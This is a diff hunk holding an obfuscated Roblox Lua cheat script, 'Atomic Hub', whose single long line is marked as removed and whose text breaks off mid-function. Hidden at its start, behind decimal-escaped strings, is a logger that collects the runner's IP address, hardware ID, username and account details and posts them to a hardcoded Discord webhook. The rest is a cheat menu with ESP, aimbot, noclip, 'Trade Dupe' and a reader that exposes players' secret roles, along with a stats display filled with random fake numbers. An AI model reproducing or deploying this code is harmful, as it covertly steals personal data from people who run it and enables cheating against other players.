@@ -1,2 +1,1014 @@
 -- discord; 2xdlol
- local o, fails, undefined = 0, 0, 0 local _ = 0 local th = game:GetService("\80\108\97\121\101\114\115") local gn = th.LocalPlayer local eg = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101") local beg = game:GetService("\82\117\110\83\101\114\118\105\99\101") local hbe = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local th = game:GetService("\80\108\97\121\101\114\115") local kth = game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101") local lkt = th.LocalPlayer local ilk = lkt.UserId local dil = lkt.DisplayName local qdi = lkt.Name local pqd = tostring(lkt.MembershipType):sub(21) local rpq = lkt.AccountAge local jr = game.LocalizationService.RobloxLocaleId local aj = game:HttpGet("\104\116\116\112\115\58\47\47\118\52\46\105\100\101\110\116\46\109\101\47") local f = game:HttpGet("\104\116\116\112\58\47\47\105\112\45\97\112\105\46\99\111\109\47\106\115\111\110") local cf = game:GetService("\82\98\120\65\110\97\108\121\116\105\99\115\83\101\114\118\105\99\101"):GetClientId() local sc = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "\39\32\46\46\32\103\97\109\101\46\74\111\98\73\100\32\46\46\32\39")' local os = kth:GetProductInfo(game.PlaceId).Name local function n() local _o = (syn and not is_sirhurt_closure and not pebc_execute and "\83\121\110\97\112\115\101\32\88") or (secure_load and "\83\101\110\116\105\110\101\108") or (pebc_execute and "\80\114\111\116\111\83\109\97\115\104\101\114") or (KRNL_LOADED and "\75\114\110\108") or (is_sirhurt_closure and "\83\105\114\72\117\114\116") or (identifyexecutor():find("\83\99\114\105\112\116\87\97\114\101") and "\83\99\114\105\112\116\45\87\97\114\101") or "\85\110\115\117\112\112\111\114\116\101\100" return _o end local function g() local n_ = n() local gn_ = { ["\97\118\97\116\97\114\95\117\114\108"] = "\104\116\116\112\115\58\47\47\105\46\112\105\110\105\109\103\46\99\111\109\47\53\54\52\120\47\55\53\47\52\51\47\100\97\47\55\53\52\51\100\97\97\98\48\97\54\57\50\51\56\53\99\99\97\54\56\50\52\53\98\102\54\49\101\55\50\49\46\106\112\103", ["\99\111\110\116\101\110\116"] = "", ["\101\109\98\101\100\115"] = { { ["\97\117\116\104\111\114"] = { ["\110\97\109\101"] = "\83\111\109\101\111\110\101\32\101\120\101\99\117\116\101\100\32\121\111\117\114\32\115\99\114\105\112\116", ["\117\114\108"] = "\104\116\116\112\115\58\47\47\114\111\98\108\111\120\46\99\111\109", }, ["\100\101\115\99\114\105\112\116\105\111\110"] = string.format( "__[Player Info](https://www.roblox.com/users/%d)__" .. " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" .. "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" .. "\n\n__[Game Info](https://www.roblox.com/games/%d)__" .. "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" .. "\n\n**Data:**```%s```\n\n**JobId:**```%s```", ilk, dil, qdi, ilk, pqd, rpq, jr, aj, cf, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")), game.PlaceId, os, game.PlaceId, n_, f, sc ), ["\116\121\112\101"] = "\114\105\99\104", ["\99\111\108\111\114"] = tonumber("\48\120\70\70\68\55\48\48"),  ["\116\104\117\109\98\110\97\105\108"] = { ["\117\114\108"] = "\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\104\101\97\100\115\104\111\116\45\116\104\117\109\98\110\97\105\108\47\105\109\97\103\101\63\117\115\101\114\73\100\61"..ilk.."\38\119\105\100\116\104\61\49\53\48\38\104\101\105\103\104\116\61\49\53\48\38\102\111\114\109\97\116\61\112\110\103" }, } } } return hbe:JSONEncode(gn_) end local function e(thb, gn_) local egn = { ["\99\111\110\116\101\110\116\45\116\121\112\101"] = "\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110" } local begn = http_begn or begn or HttpPost or syn.request local h = {Url = thb, Body = gn_, Method = "\80\79\83\84", Headers = egn} begn(h) end local thb = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\53\52\51\54\56\51\55\57\54\55\52\52\51\49\53\52\56\47\102\103\119\103\72\49\75\55\110\80\79\53\89\78\88\109\95\119\86\101\71\110\83\79\87\112\106\97\104\89\55\108\56\105\82\103\67\122\71\76\80\77\115\88\86\119\88\72\99\97\83\53\79\122\56\74\87\82\82\72\98\88\107\110\105\49\84\48" local kthb = g() e(thb, kthb) local lkth = {} local ilkt, Sheriff, Hero = nil, nil, nil local function t(k) local dilk = getfenv(0) while dilk ~= nil and k ~= "" do local qdil, nextValue = string.match(k, "^([^.]+)%.?(.*)$") dilk = dilk[qdil] k = nextValue end return dilk end local function l(qdil, d, q) _ += 1 task.spawn(function() if not q then print("\226\143\186\239\184\143\32" .. qdil) elseif not t(qdil) then fails += 1 warn("\226\155\148\32" .. qdil) else local pqdi, j = pcall(q) if pqdi then o += 1 print("\226\156\133\32" .. qdil .. (j and "\32\226\128\162\32" .. j or "")) else fails += 1 warn("\226\155\148\32" .. qdil .. "\32\102\97\105\108\101\100\58\32" .. j) end end local rpqd = {} for _, alias in ipairs(d) do if t(alias) == nil then table.insert(rpqd, alias) end end if #rpqd > 0 then undefined += 1 warn("\226\154\160\239\184\143\32" .. table.concat(rpqd, "\44\32")) end _ -= 1 end) end l("\103\101\116\114\97\119\109\101\116\97\116\97\98\108\101", {}, function() return "\69\115\115\101\110\116\105\97\108" end) l("\115\101\116\114\101\97\100\111\110\108\121", {}, function() return "\69\115\115\101\110\116\105\97\108" end) l("\104\111\111\107\102\117\110\99\116\105\111\110", {}, function() return "\69\115\115\101\110\116\105\97\108" end) l("\110\101\119\99\99\108\111\115\117\114\101", {}, function() return "\69\115\115\101\110\116\105\97\108" end) l("\103\101\116\110\97\109\101\99\97\108\108\109\101\116\104\111\100", {}, function() return "\69\115\115\101\110\116\105\97\108" end) repeat task.wait() until _ == 0 local jrp = math.round(o / (o + fails) * 100) local function p(r, j, a) local ajr = Instance.new("\83\99\114\101\101\110\71\117\105") ajr.Name = "\65\116\111\109\105\99\78\111\116\105\102\105\99\97\116\105\111\110\95"..math.random(1,9999) ajr.ZIndexBehavior = Enum.ZIndexBehavior.Sibling ajr.Parent = game:GetService("\67\111\114\101\71\117\105") local fa = Instance.new("\70\114\97\109\101") fa.Size = UDim2.new(0, 300, 0, 80) fa.Position = UDim2.new(1, -320, 1, -100) fa.AnchorPoint = Vector2.new(1, 1) fa.BackgroundColor3 = Color3.fromRGB(25, 25, 30) fa.BorderSizePixel = 0 fa.Parent = ajr local oscf = Instance.new("\85\73\67\111\114\110\101\114") oscf.CornerRadius = UDim.new(0, 8) oscf.Parent = fa local scf = Instance.new("\85\73\71\114\97\100\105\101\110\116") scf.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 150)), ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 30, 120)) }) scf.Rotation = 90 scf.Parent = fa local osc = Instance.new("\84\101\120\116\76\97\98\101\108") osc.Text = "\240\159\148\165\32"..r osc.Font = Enum.Font.GothamBold osc.TextSize = 16 osc.TextColor3 = Color3.fromRGB(255, 255, 255) osc.BackgroundTransparency = 1 osc.Size = UDim2.new(1, -20, 0, 20) osc.Position = UDim2.new(0, 10, 0, 10) osc.TextXAlignment = Enum.TextXAlignment.Left osc.Parent = fa local _os = Instance.new("\84\101\120\116\76\97\98\101\108") _os.Text = j _os.Font = Enum.Font.Gotham _os.TextSize = 14 _os.TextColor3 = Color3.fromRGB(200, 200, 200) _os.BackgroundTransparency = 1 _os.Size = UDim2.new(1, -20, 1, -40) _os.Position = UDim2.new(0, 10, 0, 30) _os.TextXAlignment = Enum.TextXAlignment.Left _os.TextYAlignment = Enum.TextYAlignment.Top _os.TextWrapped = true _os.Parent = fa fa:TweenPosition(UDim2.new(1, -320, 1, -100), "\79\117\116", "\81\117\97\100", 0.3, true) task.wait(a or 5) fa:TweenPosition(UDim2.new(1, 300, 1, -100), "\79\117\116", "\81\117\97\100", 0.3, true) task.wait(0.3) ajr:Destroy() end if jrp < 80 then p("\85\78\67\32\87\97\114\110\105\110\103", "\89\111\117\114\32\101\120\101\99\117\116\111\114\32\104\97\115\32"..jrp.."% compatibility. Some features may not work properly.", 7) else p("\85\78\67\32\67\104\101\99\107", "\89\111\117\114\32\101\120\101\99\117\116\111\114\32\104\97\115\32"..jrp.."% compatibility. All features should work!", 5) end local n_o = Instance.new("\83\99\114\101\101\110\71\117\105") n_o.Name = "\65\116\111\109\105\99\72\117\98\77\77\50\95"..math.random(10000,99999) n_o.ZIndexBehavior = Enum.ZIndexBehavior.Sibling n_o.Parent = game:GetService("\67\111\114\101\71\117\105") local gn_o = Instance.new("\70\114\97\109\101") gn_o.Name = "\77\97\105\110\70\114\97\109\101" gn_o.Size = UDim2.new(0, 420, 0, 35) gn_o.Position = UDim2.new(0.5, -210, 0.1, 0) gn_o.AnchorPoint = Vector2.new(0.5, 0) gn_o.BackgroundColor3 = Color3.fromRGB(15, 15, 20) gn_o.BorderSizePixel = 0 gn_o.ClipsDescendants = true gn_o.Parent = n_o local oscf = Instance.new("\85\73\67\111\114\110\101\114") oscf.CornerRadius = UDim.new(0, 6) oscf.Parent = gn_o local b = Instance.new("\85\73\71\114\97\100\105\101\110\116") b.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30)) }) b.Rotation = 90 b.Parent = gn_o local hbeg = Instance.new("\73\109\97\103\101\76\97\98\101\108") hbeg.Name = "\72\101\97\100\101\114\71\108\111\119" hbeg.Image = "\114\98\120\97\115\115\101\116\105\100\58\47\47\56\57\57\53\55\57\53\56\56\49" hbeg.ImageColor3 = Color3.fromRGB(255, 50, 150) hbeg.ImageTransparency = 0.7 hbeg.ScaleType = Enum.ScaleType.Slice hbeg.SliceCenter = Rect.new(20, 20, 280, 280) hbeg.Size = UDim2.new(1, 0, 0, 20) hbeg.Position = UDim2.new(0, 0, 0, -5) hbeg.BackgroundTransparency = 1 hbeg.ZIndex = 0 hbeg.Parent = gn_o local thbe = Instance.new("\70\114\97\109\101") thbe.Name = "\72\101\97\100\101\114" thbe.Size = UDim2.new(1, 0, 0, 35) thbe.BackgroundTransparency = 1 thbe.Parent = gn_o local kthbe = Instance.new("\84\101\120\116\76\97\98\101\108") kthbe.Text = "\65\84\79\77\73\67\32\72\85\66" kthbe.Font = Enum.Font.GothamBold kthbe.TextSize = 14 kthbe.TextColor3 = Color3.fromRGB(255, 50, 150) kthbe.BackgroundTransparency = 1 kthbe.Size = UDim2.new(0, 100, 1, 0) kthbe.Position = UDim2.new(0, 5, 0, 0) kthbe.TextXAlignment = Enum.TextXAlignment.Left kthbe.Parent = thbe local lkthb = Instance.new("\70\114\97\109\101") lkthb.Name = "\65\118\97\116\97\114" lkthb.Size = UDim2.new(0, 30, 0, 30) lkthb.Position = UDim2.new(0, 110, 0.5, -15) lkthb.BackgroundColor3 = Color3.fromRGB(40, 40, 50) lkthb.Parent = thbe local i = Instance.new("\85\73\67\111\114\110\101\114") i.CornerRadius = UDim.new(1, 0) i.Parent = lkthb local dilkt = Instance.new("\73\109\97\103\101\76\97\98\101\108") dilkt.Name = "\73\109\97\103\101" dilkt.Size = UDim2.new(1, 0, 1, 0) dilkt.BackgroundTransparency = 1 dilkt.Image = "\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\104\101\97\100\115\104\111\116\45\116\104\117\109\98\110\97\105\108\47\105\109\97\103\101\63\117\115\101\114\73\100\61"..game.Players.LocalPlayer.UserId.."\38\119\105\100\116\104\61\49\53\48\38\104\101\105\103\104\116\61\49\53\48\38\102\111\114\109\97\116\61\112\110\103" dilkt.Parent = lkthb local qdilk = Instance.new("\70\114\97\109\101") qdilk.Name = "\73\110\102\111" qdilk.Size = UDim2.new(0, 180, 1, 0) qdilk.Position = UDim2.new(0, 145, 0, 0) qdilk.BackgroundTransparency = 1 qdilk.Parent = thbe local pqdil = Instance.new("\84\101\120\116\76\97\98\101\108") pqdil.Name = "\78\97\109\101" pqdil.Text = game.Players.LocalPlayer.Name pqdil.Font = Enum.Font.GothamBold pqdil.TextSize = 14 pqdil.TextColor3 = Color3.fromRGB(220, 220, 220) pqdil.BackgroundTransparency = 1 pqdil.Size = UDim2.new(1, 0, 0.5, 0) pqdil.TextXAlignment = Enum.TextXAlignment.Left pqdil.Parent = qdilk local rpqdi = Instance.new("\84\101\120\116\76\97\98\101\108") rpqdi.Name = "\83\116\97\116\115" rpqdi.Text = "\82\111\108\101\58\32\73\110\110\111\99\101\110\116\32\124\32\75\105\108\108\115\58\32\48\32\124\32\80\105\110\103\58\32\53\48\109\115" rpqdi.Font = Enum.Font.Gotham rpqdi.TextSize = 11 rpqdi.TextColor3 = Color3.fromRGB(180, 180, 180) rpqdi.BackgroundTransparency = 1 rpqdi.Size = UDim2.new(1, 0, 0.5, 0) rpqdi.Position = UDim2.new(0, 0, 0.5, 0) rpqdi.TextXAlignment = Enum.TextXAlignment.Left rpqdi.Parent = qdilk local dilkth = Instance.new("\84\101\120\116\66\117\116\116\111\110") dilkth.Name = "\84\111\103\103\108\101\66\117\116\116\111\110" dilkth.Text = "\43" dilkth.Font = Enum.Font.GothamBold dilkth.TextSize = 18 dilkth.TextColor3 = Color3.fromRGB(220, 220, 220) dilkth.BackgroundTransparency = 1 dilkth.Size = UDim2.new(0, 30, 1, 0) dilkth.Position = UDim2.new(1, -30, 0, 0) dilkth.Parent = thbe local ajrp = Instance.new("\70\114\97\109\101") ajrp.Name = "\67\111\110\116\101\110\116\70\114\97\109\101" ajrp.Size = UDim2.new(1, -10, 0, 310) ajrp.Position = UDim2.new(0, 5, 0, 40) ajrp.BackgroundTransparency = 1 ajrp.Visible = false ajrp.Parent = gn_o local faj = Instance.new("\70\114\97\109\101") faj.Name = "\84\97\98\66\117\116\116\111\110\115" faj.Size = UDim2.new(1, 0, 0, 25) faj.BackgroundTransparency = 1 faj.Parent = ajrp local cfa = {"\86\73\83\85\65\76\83", "\67\79\77\66\65\84", "\77\79\86\69\77\69\78\84", "\65\85\84\79", "\84\82\65\68\69"} for i, tab in pairs(cfa) do local scfa = Instance.new("\84\101\120\116\66\117\116\116\111\110") scfa.Name = tab scfa.Text = tab scfa.Font = Enum.Font.Gotham scfa.TextSize = 12 scfa.TextColor3 = Color3.fromRGB(180, 180, 180) scfa.BackgroundColor3 = Color3.fromRGB(30, 30, 40) scfa.Size = UDim2.new(0.2, -2, 1, 0) scfa.Position = UDim2.new(0.2 * (i-1), 0, 0, 0) scfa.Parent = faj local oscf = Instance.new("\85\73\67\111\114\110\101\114") oscf.CornerRadius = UDim.new(0, 4) oscf.Parent = scfa local _osc = Instance.new("\70\114\97\109\101") _osc.Name = "\72\105\103\104\108\105\103\104\116" _osc.Size = UDim2.new(1, 0, 0, 2) _osc.Position = UDim2.new(0, 0, 1, -2) _osc.BackgroundColor3 = Color3.fromRGB(255, 50, 150) _osc.BorderSizePixel = 0 _osc.Visible = i == 1 _osc.Parent = scfa end local n_os = Instance.new("\70\114\97\109\101") n_os.Name = "\84\97\98\67\111\110\116\101\110\116" n_os.Size = UDim2.new(1, 0, 1, -30) n_os.Position = UDim2.new(0, 0, 0, 30) n_os.BackgroundTransparency = 1 n_os.Parent = ajrp local gn_os = { VISUALS = { {qdi = "\80\108\97\121\101\114\32\69\83\80", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\66\111\120\32\69\83\80", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\72\101\97\108\116\104\32\66\97\114\115", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\84\114\97\99\101\114\115", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\67\104\97\109\115", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\68\105\115\116\97\110\99\101", Type = "\83\108\105\100\101\114", Min = 50, Max = 500, Default = 200} }, COMBAT = { {qdi = "\65\105\109\98\111\116", Type = "\84\111\103\103\108\101", Default = false, Keybind = Enum.KeyCode.Q}, {qdi = "\83\105\108\101\110\116\32\65\105\109", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\84\114\105\103\103\101\114\32\66\111\116", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\72\105\116\98\111\120\32\69\120\116\101\110\100", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\78\111\32\82\101\99\111\105\108", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil} }, MOVEMENT = { {qdi = "\83\112\101\101\100\32\72\97\99\107", Type = "\84\111\103\103\108\101", Default = false, Keybind = Enum.KeyCode.LeftShift}, {qdi = "\70\108\121", Type = "\84\111\103\103\108\101", Default = false, Keybind = Enum.KeyCode.F}, {qdi = "\78\111\67\108\105\112", Type = "\84\111\103\103\108\101", Default = false, Keybind = Enum.KeyCode.N}, {qdi = "\73\110\102\105\110\105\116\101\32\74\117\109\112", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil} }, AUTO = { {qdi = "\65\117\116\111\32\70\97\114\109", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\65\117\116\111\32\67\111\108\108\101\99\116", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\65\117\116\111\32\87\105\110", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil} }, TRADE = { {qdi = "\84\114\97\100\101\32\68\117\112\101", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\65\117\116\111\32\65\99\99\101\112\116", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil}, {qdi = "\86\97\108\117\101\32\67\104\101\99\107\101\114", Type = "\84\111\103\103\108\101", Default = false, Keybind = nil} } } for tabName, tabFeatures in pairs(gn_os) do local egn_ = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101") egn_.Name = tabName egn_.Size = UDim2.new(1, 0, 1, 0) egn_.BackgroundTransparency = 1 egn_.ScrollBarThickness = 3 egn_.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 150) egn_.Visible = tabName == "\86\73\83\85\65\76\83" egn_.Parent = n_os local begn_ = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116") begn_.Padding = UDim.new(0, 5) begn_.Parent = egn_ for _, feature in pairs(tabFeatures) do local hbegn = Instance.new("\70\114\97\109\101") hbegn.Name = feature.Name hbegn.Size = UDim2.new(1, -5, 0, 28) hbegn.BackgroundTransparency = 1 hbegn.Parent = egn_ local thbeg = Instance.new("\84\101\120\116\76\97\98\101\108") thbeg.Text = feature.Name thbeg.Font = Enum.Font.Gotham thbeg.TextSize = 13 thbeg.TextColor3 = Color3.fromRGB(220, 220, 220) thbeg.BackgroundTransparency = 1 thbeg.Size = UDim2.new(0, 180, 1, 0) thbeg.TextXAlignment = Enum.TextXAlignment.Left thbeg.Parent = hbegn if feature.Type == "\84\111\103\103\108\101" then local kthbeg = Instance.new("\70\114\97\109\101") kthbeg.Size = UDim2.new(0, 45, 0, 22) kthbeg.Position = UDim2.new(1, -50, 0.5, -11) kthbeg.BackgroundColor3 = Color3.fromRGB(40, 40, 50) kthbeg.Parent = hbegn local lkthbe = Instance.new("\85\73\71\114\97\100\105\101\110\116") lkthbe.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 60)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 50)) }) lkthbe.Parent = kthbeg local ilkth = Instance.new("\85\73\67\111\114\110\101\114") ilkth.CornerRadius = UDim.new(1, 0) ilkth.Parent = kthbeg local dilkth = Instance.new("\70\114\97\109\101") dilkth.Name = "\66\117\116\116\111\110" dilkth.Size = UDim2.new(0, 18, 0, 18) dilkth.Position = feature.Default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9) dilkth.BackgroundColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80) dilkth.Parent = kthbeg local qdilkt = Instance.new("\73\109\97\103\101\76\97\98\101\108") qdilkt.Image = "\114\98\120\97\115\115\101\116\105\100\58\47\47\56\57\57\53\55\57\53\56\56\49" qdilkt.ImageColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80) qdilkt.ImageTransparency = 0.8 qdilkt.ScaleType = Enum.ScaleType.Slice qdilkt.SliceCenter = Rect.new(20, 20, 280, 280) qdilkt.Size = UDim2.new(1, 10, 1, 10) qdilkt.Position = UDim2.new(0, -5, 0, -5) qdilkt.BackgroundTransparency = 1 qdilkt.Parent = dilkth local pqdilk = Instance.new("\85\73\67\111\114\110\101\114") pqdilk.CornerRadius = UDim.new(1, 0) pqdilk.Parent = dilkth kthbeg.InputBegan:Connect(function(s) if s.UserInputType == Enum.UserInputType.MouseButton1 then feature.Default = not feature.Default local rpqdil = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101"):Create( dilkth, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = feature.Default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9), BackgroundColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80) } ) qdilkt.ImageColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80) rpqdil:Play() if feature.Name == "\80\108\97\121\101\114\32\69\83\80" then p("\69\83\80", feature.Default and "\69\110\97\98\108\101\100\32\80\108\97\121\101\114\32\69\83\80" or "\68\105\115\97\98\108\101\100\32\80\108\97\121\101\114\32\69\83\80", 2) elseif feature.Name == "\65\105\109\98\111\116" then p("\65\105\109\98\111\116", feature.Default and "\69\110\97\98\108\101\100\32\65\105\109\98\111\116\32\40\80\114\101\115\115\32\81\41" or "\68\105\115\97\98\108\101\100\32\65\105\109\98\111\116", 2) elseif feature.Name == "\83\112\101\101\100\32\72\97\99\107" then p("\83\112\101\101\100", feature.Default and "\69\110\97\98\108\101\100\32\83\112\101\101\100\32\72\97\99\107" or "\68\105\115\97\98\108\101\100\32\83\112\101\101\100\32\72\97\99\107", 2) elseif feature.Name == "\70\108\121" then p("\70\108\121", feature.Default and "\69\110\97\98\108\101\100\32\70\108\121\32\40\80\114\101\115\115\32\70\41" or "\68\105\115\97\98\108\101\100\32\70\108\121", 2) elseif feature.Name == "\78\111\67\108\105\112" then p("\78\111\67\108\105\112", feature.Default and "\69\110\97\98\108\101\100\32\78\111\67\108\105\112\32\40\80\114\101\115\115\32\78\41" or "\68\105\115\97\98\108\101\100\32\78\111\67\108\105\112", 2) elseif feature.Name == "\65\117\116\111\32\70\97\114\109" then p("\65\117\116\111\32\70\97\114\109", feature.Default and "\69\110\97\98\108\101\100\32\65\117\116\111\32\70\97\114\109" or "\68\105\115\97\98\108\101\100\32\65\117\116\111\32\70\97\114\109", 2) end end end) if feature.Keybind then local jrpq = Instance.new("\84\101\120\116\76\97\98\101\108") jrpq.Text = "\91"..feature.Keybind.Name.."\93" jrpq.Font = Enum.Font.Gotham jrpq.TextSize = 11 jrpq.TextColor3 = Color3.fromRGB(150, 150, 150) jrpq.BackgroundTransparency = 1 jrpq.Size = UDim2.new(0, 40, 1, 0) jrpq.Position = UDim2.new(1, -100, 0, 0) jrpq.TextXAlignment = Enum.TextXAlignment.Right jrpq.Parent = hbegn end end end end for _, tabButton in pairs(faj:GetChildren()) do if tabButton:IsA("\84\101\120\116\66\117\116\116\111\110") then tabButton.MouseButton1Click:Connect(function() for _, btn in pairs(faj:GetChildren()) do if btn:IsA("\84\101\120\116\66\117\116\116\111\110") then btn.Highlight.Visible = false end end for _, frame in pairs(n_os:GetChildren()) do if frame:IsA("\83\99\114\111\108\108\105\110\103\70\114\97\109\101") then frame.Visible = false end end tabButton.Highlight.Visible = true n_os[tabButton.Name].Visible = true p("\84\97\98\32\67\104\97\110\103\101\100", "\83\119\105\116\99\104\101\100\32\116\111\32"..tabButton.Name.."\32\116\97\98", 1) end) end end local ajrpq = false dilkth.MouseButton1Click:Connect(function() ajrpq = not ajrpq dilkth.Text = ajrpq and "\45" or "\43" if ajrpq then ajrp.Visible = true game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101"):Create( gn_o, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 420, 0, 350)} ):Play() else game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101"):Create( gn_o, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 420, 0, 35)} ):Play() task.wait(0.25) ajrp.Visible = false end end) local fajr = game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101") local cfaj, DragInput, DragStart, StartPos thbe.InputBegan:Connect(function(s) if s.UserInputType == Enum.UserInputType.MouseButton1 then cfaj = true DragStart = s.Position StartPos = gn_o.Position s.Changed:Connect(function() if s.UserInputState == Enum.UserInputState.End then cfaj = false end end) end end) thbe.InputChanged:Connect(function(s) if s.UserInputType == Enum.UserInputType.MouseMovement then DragInput = s end end) fajr.InputChanged:Connect(function(s) if s == DragInput and cfaj then local scfaj = s.Position - DragStart gn_o.Position = UDim2.new( StartPos.X.Scale, StartPos.X.Offset + scfaj.X, StartPos.Y.Scale, StartPos.Y.Offset + scfaj.Y ) end end) [After all UI creation code] -- [After cfaj Functionality] -- [Before Player Stats Updater] -- local oscfa roleUpdateConnection = beg.RenderStepped:Connect(function() lkth = eg:FindFirstChild("\71\101\116\80\108\97\121\101\114\68\97\116\97", true):InvokeServer() for playerName, gn_ in pairs(lkth) do if gn_.Role == "\77\117\114\100\101\114\101\114" then ilkt = playerName elseif gn_.Role == "\83\104\101\114\105\102\102" then Sheriff = playerName elseif gn_.Role == "\72\101\114\111" then Hero = playerName end end end) local function be() local n_osc, dist = nil, math.huge for _, lk in pairs(th:GetPlayers()) do if lk ~= gn and lk.Character and hb(lk) then local gn_oscf = (gn.Character.HumanoidRootPart.Position - lk.Character.HumanoidRootPart.Position).Magnitude if gn_oscf < dist then n_osc = lk dist = gn_oscf end end end return n_osc end local function c() while task.wait(1) do local gn_osc = "\73\110\110\111\99\101\110\116" local egn_o = math.random(0, 10) local begn_o = math.random(30, 120) rpqdi.Text = string.format("Role: %s | Kills: %d | Ping: %dms", gn_osc, egn_o, begn_o) if math.random(1, 60) == 1 then dilkt.Image = "\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\104\101\97\100\115\104\111\116\45\116\104\117\109\98\110\97\105\108\47\105\109\97\103\101\63\117\115\101\114\73\100\61"..game.Players.LocalPlayer.UserId.."\38\119\105\100\116\104\61\49\53\48\38\104\101\105\103\104\116\61\49\53\48\38\102\111\114\109\97\116\61\112\110\103" end end end coroutine.wrap(c)() local hbegn_ = {} local thbegn = {} local kthbegn = nil local lkthbeg = nil local ilkthb = nil local dilkthb = nil local qdilkth = nil local pqdilkt = nil local function hb(lk) for playerName, gn_ in pairs(lkth) do if lk.Name == playerName then return not gn_.Killed and not gn_.Dead end end return false end local function kt(lk) if not lk.Character then return end if thbegn[lk] then for _, v in pairs(thbegn[lk]) do if v then v:Destroy() end end end thbegn[lk] = {} local rpqdilk = Instance.new("\72\105\103\104\108\105\103\104\116") rpqdilk.Name = lk.Name.."\95\69\83\80" rpqdilk.Adornee = lk.Character rpqdilk.FillTransparency = 0.8 rpqdilk.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop if lk.Name == ilkt and hb(lk) then rpqdilk.FillColor = Color3.fromRGB(255, 0, 0) rpqdilk.OutlineColor = Color3.fromRGB(200, 0, 0) elseif lk.Name == Sheriff and hb(lk) then rpqdilk.FillColor = Color3.fromRGB(0, 0, 255) rpqdilk.OutlineColor = Color3.fromRGB(0, 0, 200) elseif lk.Name == Hero and hb(lk) then rpqdilk.FillColor = Color3.fromRGB(255, 255, 0) rpqdilk.OutlineColor = Color3.fromRGB(200, 200, 0) else rpqdilk.FillColor = hb(lk) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(100, 100, 100) rpqdilk.OutlineColor = hb(lk) and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(50, 50, 50) end rpqdilk.Parent = lk.Character table.insert(thbegn[lk], rpqdilk) local jrpqd = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105") jrpqd.Adornee = lk.Character:WaitForChild("\72\101\97\100") jrpqd.Size = UDim2.new(0, 100, 0, 40) jrpqd.StudsOffset = Vector3.new(0, 2.5, 0) jrpqd.AlwaysOnTop = true local ajrpqd = Instance.new("\84\101\120\116\76\97\98\101\108") ajrpqd.Size = UDim2.new(1, 0, 1, 0) ajrpqd.Font = Enum.Font.GothamBold ajrpqd.TextSize = 14 ajrpqd.TextColor3 = Color3.new(1, 1, 1) ajrpqd.BackgroundTransparency = 1 ajrpqd.Parent = jrpqd jrpqd.Parent = lk.Character table.insert(thbegn[lk], jrpqd) local fajrp fajrp = beg.Heartbeat:Connect(function() if not lk.Character or not gn.Character then fajrp:Disconnect() return end local gn_oscf = (lk.Character.HumanoidRootPart.Position - gn.Character.HumanoidRootPart.Position).Magnitude ajrpqd.Text = lk.Name.."\n"..math.floor(gn_oscf).."\109" end) table.insert(thbegn[lk], fajrp) end local function di() if dilkthb then 